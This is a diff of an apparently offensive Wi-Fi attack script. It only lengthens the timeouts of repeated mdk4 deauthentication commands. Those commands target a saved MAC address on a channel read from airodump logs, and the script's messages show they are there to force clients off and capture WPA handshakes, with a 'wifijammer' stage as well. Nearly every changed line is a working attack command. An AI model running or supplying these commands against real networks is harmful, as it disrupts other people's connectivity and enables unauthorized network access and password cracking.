@@ -159,7 +159,7 @@ fi
 echo " "
 echo "continues attack process..."
 # ***************************************************************************************
-timeout 12s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
+timeout 15s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
 echo " "
 echo "again mdk4 attack ready after time -> 10s, and check handshake !!!"
 sleep 13
@@ -190,7 +190,7 @@ fi
 echo " "
 echo "continues attack process..."
 # ***************************************************************************************
-timeout 15s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
+timeout 17s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
 
 # ----------------FINAL ATTACK METHOD---REVERSE CLIENT SELECTION-->tail intead->head---------------------------------------
 echo " "
@@ -289,7 +289,7 @@ fi
 echo " "
 echo "continues attack process..."
 # ***************************************************************************************
-timeout 12s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
+timeout 15s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
 echo " "
 echo "again mdk4 attack ready after time -> 10s, and check handshake !!!"
 sleep 15
@@ -320,7 +320,7 @@ fi
 echo " "
 echo "continues attack process..."
 # ***************************************************************************************
-timeout 15s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
+timeout 17s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-[0-9][0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
 echo " "
 echo "wifijammer attack ready after time -> 10s, and check handshake !!!"
 sleep 15
